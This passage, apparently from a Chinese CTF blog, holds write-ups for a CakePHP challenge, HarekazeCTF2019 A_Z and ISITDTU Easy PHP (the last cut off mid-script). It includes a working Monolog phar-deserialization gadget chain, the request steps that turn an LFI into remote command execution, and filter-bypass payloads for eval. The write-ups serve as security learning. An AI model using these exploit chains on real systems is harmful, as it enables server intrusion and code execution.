class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_cache_dir</span>(<span class=\"params\">$key</span>)</span>&#123;</span><br><span class=\"line\">        $ip = <span class=\"keyword\">$this</span>-&gt;request-&gt;getEnv(<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class=\"line\">        $index = sprintf(<span class=\"string\">&#x27;mycache/%s/%s/&#x27;</span>, $ip, $key);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> CACHE . $index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cache_set</span>(<span class=\"params\">$key, $response</span>) </span>&#123;</span><br><span class=\"line\">        $cache_dir = <span class=\"keyword\">$this</span>-&gt;_cache_dir($key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class=\"line\">            mkdir($cache_dir, <span class=\"number\">0700</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            file_put_contents($cache_dir . <span class=\"string\">&quot;body.cache&quot;</span>, $response-&gt;body);</span><br><span class=\"line\">            file_put_contents($cache_dir . <span class=\"string\">&quot;headers.cache&quot;</span>, serialize($response-&gt;headers));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cache_get</span>(<span class=\"params\">$key</span>) </span>&#123;</span><br><span class=\"line\">        $cache_dir = <span class=\"keyword\">$this</span>-&gt;_cache_dir($key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file_exists($cache_dir)) &#123;</span><br><span class=\"line\">            $body   = file_get_contents($cache_dir . <span class=\"string\">&quot;/body.cache&quot;</span>);</span><br><span class=\"line\">            $headers = file_get_contents($cache_dir . <span class=\"string\">&quot;/headers.cache&quot;</span>);</span><br><span class=\"line\">            </span><br><span class=\"line\">            $body = <span class=\"string\">&quot;&lt;!-- from cache --&gt;\\n&quot;</span> . $body;</span><br><span class=\"line\">            $headers = unserialize($headers);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> DymmyResponse($headers, $body);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">display</span>(<span class=\"params\">...$path</span>) </span>&#123;    </span><br><span class=\"line\">        $request  = <span class=\"keyword\">$this</span>-&gt;request;</span><br><span class=\"line\">        $data = $request-&gt;getQuery(<span class=\"string\">&#x27;data&#x27;</span>);</span><br><span class=\"line\">        $url  = $request-&gt;getQuery(<span class=\"string\">&#x27;url&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strlen($url) == <span class=\"number\">0</span>) </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;back();</span><br><span class=\"line\">    </span><br><span class=\"line\">        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strlen($scheme) == <span class=\"number\">0</span> || !in_array($scheme, [<span class=\"string\">&#x27;http&#x27;</span>, <span class=\"string\">&#x27;https&#x27;</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;back();</span><br><span class=\"line\">    </span><br><span class=\"line\">        $method = strtolower( $request-&gt;getMethod() );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !in_array($method, [<span class=\"string\">&#x27;get&#x27;</span>, <span class=\"string\">&#x27;post&#x27;</span>, <span class=\"string\">&#x27;put&#x27;</span>, <span class=\"string\">&#x27;delete&#x27;</span>, <span class=\"string\">&#x27;patch&#x27;</span>]) )</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;back();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        $headers = [];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($request-&gt;getHeaders() <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array( strtolower($key), [<span class=\"string\">&#x27;host&#x27;</span>, <span class=\"string\">&#x27;connection&#x27;</span>, <span class=\"string\">&#x27;expect&#x27;</span>, <span class=\"string\">&#x27;content-length&#x27;</span>] ))</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (count($value) == <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">            $headers[$key] = $value[<span class=\"number\">0</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        $key = md5($url);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($method == <span class=\"string\">&#x27;get&#x27;</span>) &#123;</span><br><span class=\"line\">            $response = <span class=\"keyword\">$this</span>-&gt;cache_get($key);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$response) &#123;</span><br><span class=\"line\">                $response = <span class=\"keyword\">$this</span>-&gt;httpclient($method, $url, $headers, <span class=\"literal\">null</span>);</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;cache_set($key, $response);                </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $response = <span class=\"keyword\">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($response-&gt;headers <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (strtolower($key) == <span class=\"string\">&#x27;content-type&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;response-&gt;type(<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;type&#x27;</span> =&gt; $value));</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;response-&gt;type(<span class=\"string\">&#x27;type&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>很明显，允许我们输入的 URL 只能是 HTTP 或 HTTPS 协议的，然后根据访问题目页面的 HTTP 方式去，通过一个 httpclient 来对输入 URL 进行访问。如果使用的是 GET 方式，会设置缓存。同时，访问题目页面时的 HTTP 头也会同时发送到 httpclient 中。</p>\r\n<p>  然后我们该看啥？从来没有源码审计的经验，没思路。既然我们请求的 URL 是通过 httpclient 实现的，看一下 Httpclient 吧。在这之前，我们注意到在用 GET 请求的时候，会进行缓存操作，而这个缓存是自定义的。在 cache_get () 里，$header 有一个 unserialize 操作，有点可疑，而且是用的 file_get_contents () 读的缓存。同样的，cache_set () 里会对 $response 返回的 headers 序列化，用 file_put_contents () 写的缓存。暂时不知道这两处怎么利用。</p>\r\n<p>  跟进 Httpclient，这是一个对 Client 类的封装。来到 vendor/cakephp/cakephp/src/Http/Client.php 里。<code>__construct</code> 方法貌似没什么好玩的，就是对 Cookie 的操作。主要是 public function post ($url, $data = [], array $options = []) 这个函数，先 buildUrl，然后_doRequests 发送。buildUrl 没什么意思，对输入的 URL 处理一下。而_doRequests () 先是调用_createRequest ()，然后 send ()。跟进_createRequest ()，前面进行头处理，后面 new 一个 Request 对象。跟进，来到 vendor/cakephp/cakephp/src/Http/Client/Request.php。__construct () 设置了 Connection 和 User-Agent 头后调用 body () 函数处理 $data。而 $data 使用 FormData-&gt;addMany () 处理。跟进 addMany ()，来到 vendor/cakephp/cakephp/src/Http/Client/FormData.php。addMany () 函数就是将 $data 数组逐项喂给 add () 函数，重点来了。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">$name, $value = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_array($value)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;addRecursive($name, $value);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> (is_resource($value)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;addFile($name, $value);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class=\"number\">0</span>] === <span class=\"string\">&#x27;@&#x27;</span>) &#123;</span><br><span class=\"line\">        trigger_error(</span><br><span class=\"line\">            <span class=\"string\">&#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27;</span> .</span><br><span class=\"line\">            <span class=\"string\">&#x27;Instead you should use file handles.&#x27;</span>,</span><br><span class=\"line\">            E_USER_DEPRECATED</span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;addFile($name, $value);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">elseif</span> ($name <span class=\"keyword\">instanceof</span> FormDataPart &amp;&amp; $value === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_hasComplexPart = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_parts[] = $name;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_parts[] = <span class=\"keyword\">$this</span>-&gt;newPart($name, $value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>第 8 行的判断很有问题，如果 $value 首字符为 @，会 trigger_error ()，然后 addFile ()。trigger_error () 不会停止执行，下面看 addFile ()。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addFile</span>(<span class=\"params\">$name, $value</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;_hasFile = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    $filename = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    $contentType = <span class=\"string\">&#x27;application/octet-stream&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_resource($value)) &#123;</span><br><span class=\"line\">        $content = stream_get_contents($value);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stream_is_local($value)) &#123;</span><br><span class=\"line\">            $finfo = <span class=\"keyword\">new</span> finfo(FILEINFO_MIME);</span><br><span class=\"line\">            $metadata = stream_get_meta_data($value);</span><br><span class=\"line\">            $contentType = $finfo-&gt;file($metadata[<span class=\"string\">&#x27;uri&#x27;</span>]);</span><br><span class=\"line\">            $filename = basename($metadata[<span class=\"string\">&#x27;uri&#x27;</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        $finfo = <span class=\"keyword\">new</span> finfo(FILEINFO_MIME);</span><br><span class=\"line\">        $value = substr($value, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $filename = basename($value);</span><br><span class=\"line\">        $content = file_get_contents($value);</span><br><span class=\"line\">        $contentType = $finfo-&gt;file($value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $part = <span class=\"keyword\">$this</span>-&gt;newPart($name, $content);</span><br><span class=\"line\">    $part-&gt;type($contentType);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($filename) &#123;</span><br><span class=\"line\">        $part-&gt;filename($filename);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;add($part);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> $part;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p><span class=\"math inline\">\\(value 没有任何过滤，直接 file_get_contents (\\)</span>value)，然后返回到 $part。因此这里有一处 LFI。然后我们能干什么呢？</p>\r\n<h1 id=\"part-2.lfi-to-rce.\">Part 2.LFI to RCE.</h1>\r\n<p>2018 年特别火的一个考点就是 phar:// 的反序列化漏洞问题。而 file_get_contents 确实也可以造成<a href=\"https://xz.aliyun.com/t/2958\">反序列化</a>。那么本题解题思路出来了：</p>\r\n<ol type=\"1\">\r\n<li>首先需要一台 VPS。利用请求将恶意 phar 文件保存在 cache 中。</li>\r\n<li>然后发出 POST 请求，最终使 file_get_contents () 触发 cache 中的 phar RCE。</li>\r\n</ol>\r\n<p>  思路明确了，但是我们要找一个能够触发反序列化漏洞的点。这时不妨回去看看 composer.json。其中 monolog/monolog 这个包有点引人注意，它曾经确实的出现过反序列化漏洞，去找一下信息，题目所安装的版本也确实存在这个漏洞。那么直接写这个 Payload 就好了。Github 上有。构造如下：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Monolog</span>\\<span class=\"title\">Handler</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">SyslogUdpHandler</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title\">protected</span> $<span class=\"title\">socket</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$x</span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;socket = $x;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BufferHandler</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $handler;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $bufferSize = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $buffer;</span><br><span class=\"line\">        <span class=\"comment\"># ($record[&#x27;level&#x27;] &lt; $this-&gt;level) == false</span></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $level = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $initialized = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"comment\"># ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false</span></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $bufferLimit = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $processors;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$methods, $command</span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;processors = $methods;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;buffer = [$command];</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;handler = <span class=\"keyword\">clone</span> <span class=\"keyword\">$this</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    $<span class=\"title\">cmd</span> = &quot;<span class=\"title\">ls</span> -<span class=\"title\">alt</span>&quot;; <span class=\"comment\">//Modify here.</span></span><br><span class=\"line\"></span><br><span class=\"line\">    $obj = <span class=\"keyword\">new</span> \\Monolog\\Handler\\SyslogUdpHandler(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> \\Monolog\\Handler\\BufferHandler(</span><br><span class=\"line\">            [<span class=\"string\">&#x27;current&#x27;</span>, <span class=\"string\">&#x27;system&#x27;</span>],</span><br><span class=\"line\">            [$cmd, <span class=\"string\">&#x27;level&#x27;</span> =&gt; <span class=\"literal\">null</span>]</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">    </span><br><span class=\"line\">    $phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&#x27;exploit.phar&#x27;</span>);</span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    $phar-&gt;addFromString(<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;test&#x27;</span>);</span><br><span class=\"line\">    $phar-&gt;setStub(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class=\"line\">    $phar-&gt;setMetadata($obj);</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>  将生成的 exploit.phar 放到服务器上，然后在题目页面上进行如下操作： <div class=\"mermaid\">\n\nA[&quot;使用 GET 方式访问 http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&#x2F;exploit.phar&quot;] --&gt; B\nB[&quot;使用 POST 方式访问 &#96;http:&#x2F;&#x2F;XXX.XXX.XXX.XXX&#x2F;?url&#x3D;http:&#x2F;&#x2F;YYY.YYY.YYY.YYY&amp;data[test\\]&#x3D;@phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;tmp&#x2F;cache&#x2F;mycache&#x2F;CLIENT_IP&#x2F;MD5(http:&#x2F;&#x2F;IP&#x2F;exploit.phar)&#x2F;body.cache&quot;]\n</div>   这样就可以 Getshell 了。</p>\r\n\n    <div id=\"aplayer-ADiJHPUq\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"1394897325\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{851489de-10d6-450b-b8f9-479bfd2e4dd5}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","Web","CakePHP"]},{"title":"HarekazeCTF2019-A_Z","url":"/2019/09/12/HarekazeCTF2019-A-Z/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>久违的Misc。NodeJS写的网站，给了源码： <a id=\"more\"></a> <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;path&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> vm = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = express();</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(<span class=\"string\">&#x27;views&#x27;</span>, path.join(__dirname, <span class=\"string\">&#x27;views&#x27;</span>));</span><br><span class=\"line\">app.set(<span class=\"string\">&#x27;view engine&#x27;</span>, <span class=\"string\">&#x27;pug&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(express.static(path.join(__dirname, <span class=\"string\">&#x27;public&#x27;</span>)));</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> output = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> code = req.query.code + <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (code &amp;&amp; code.length &lt; <span class=\"number\">200</span> &amp;&amp; !<span class=\"regexp\">/[^a-z().]/</span>.test(code)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> result = vm.runInNewContext(code, &#123;&#125;, &#123; <span class=\"attr\">timeout</span>: <span class=\"number\">500</span> &#125;);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (result === <span class=\"number\">1337</span>) &#123;</span><br><span class=\"line\">        output = process.env.FLAG;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        output = <span class=\"string\">&#x27;nope&#x27;</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">      output = <span class=\"string\">&#x27;nope&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    output = <span class=\"string\">&#x27;nope&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  res.render(<span class=\"string\">&#x27;index&#x27;</span>, &#123; <span class=\"attr\">title</span>: <span class=\"string\">&#x27;[a-z().]&#x27;</span>, output &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">&#x27;/source&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.sendFile(path.join(__dirname, <span class=\"string\">&#x27;app.js&#x27;</span>));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = app;</span><br></pre></td></tr></table></figure></p>\r\n<p>我们被要求只能使用[a-z().]这些字符来输出1337，就会返回flag。</p>\r\n<p>我们可以用<code>(typeof(this)).constructor()</code>构造出空字符串，而JS中1==true，所以<code>(typeof(this)).constructor().length.constructor(true)</code>就会构造出1，或者true.constructor.length。3可以用字符串的big()方法的name.length获得，7可以用true.constructor.name.length得到。最后将所有字符concat在一起即可。</p>\r\n<p>所以最后Payload（不唯一）：eval((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length))</p>\r\n\n    <div id=\"aplayer-GeTaifFR\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"29816799\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{37fc4573-3305-486f-bcee-f7f8dbad3aa8}</p>\r\n","categories":["Writeups"],"tags":["Misc","NodeJS"]},{"title":"ISITDTU-Easy PHP","url":"/2019/07/18/ISITDTU-Easy-PHP/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>本来都弃坑Web了，然后发现自己还在CTFTraining项目里，放假快一个月天天咸鱼，稍微做点工作吧。 ISITDTU CTF 2019的Easy PHP，题目描述：Don't try to run any Linux command, just use all the PHP functions you know to get the flag。言简意赅。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$_ = @$_GET[<span class=\"string\">&#x27;_&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( preg_match(<span class=\"string\">&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;</span>, $_) )</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;rosé will not do it&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( strlen(count_chars(strtolower($_), <span class=\"number\">0x3</span>)) &gt; <span class=\"number\">0xd</span> )</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;you are so close, omg&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>($_);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>核心就是绕那两个if。第一个正则有点复杂，这里推荐个<a href=\"https://regex101.com/\">网站</a>，方便调试正则。总而言之，那个正则的意思是匹配00到空格()的字符，0到9的数字、<code>\"$&amp;.,|[&#123;_defgops</code>以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符。换言之，允许出现的字符如下：<code>!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~</code>。</p>\r\n<p>那么，我们先来看看PHP内置函数符合上述条件的有哪些。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$array=get_defined_functions();</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($array[<span class=\"string\">&#x27;internal&#x27;</span>] <span class=\"keyword\">as</span> $arr)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( preg_match(<span class=\"string\">&#x27;/[\\x00- 0-9\\&#x27;&quot;\\`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;</span>, $arr) ) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( strlen(count_chars(strtolower($arr), <span class=\"number\">0x3</span>)) &gt; <span class=\"number\">0xd</span> ) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span>($arr.<span class=\"string\">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>然后我们得到如下列表：</p>\r\n<ul>\r\n<li>bcmul</li>\r\n<li>ltrim rtrim trim</li>\r\n<li>chr</li>\r\n<li>link unlink</li>\r\n<li>tan atan atanh tanh</li>\r\n<li>intval</li>\r\n<li>mail</li>\r\n<li>min max</li>\r\n</ul>\r\n<p>这些函数跟文件读取没有任何关系。。。。那么我们如何在没有引号的情况下得到任意字符串呢？</p>\r\n<p>PHP在处理字符串时有个有趣的特性。</p>\r\n<img src=\"/2019/07/18/ISITDTU-Easy-PHP/Undefined-constant.png\" class=\"\" title=\"Undefined Constant Notice\">\r\n<p>PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p>\r\n<p>还有一点，PHP调用函数，可以使用字符串调用。</p>\r\n<img src=\"/2019/07/18/ISITDTU-Easy-PHP/String-call-function.png\" class=\"\" title=\"Use string to call function\">\r\n<p>注意到<code>^</code>符号没有被ban，那么我们就可以通过对字符串进行运算来规避if了。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">final_string=<span class=\"string\">&quot;phpinfo&quot;</span></span><br><span class=\"line\">allowed=<span class=\"string\">&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> final_string:    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> allowed:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> allowed:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ord(i)^ord(p)==ord(a):</span><br><span class=\"line\">                print(<span class=\"string\">&quot;i=%s p=%s 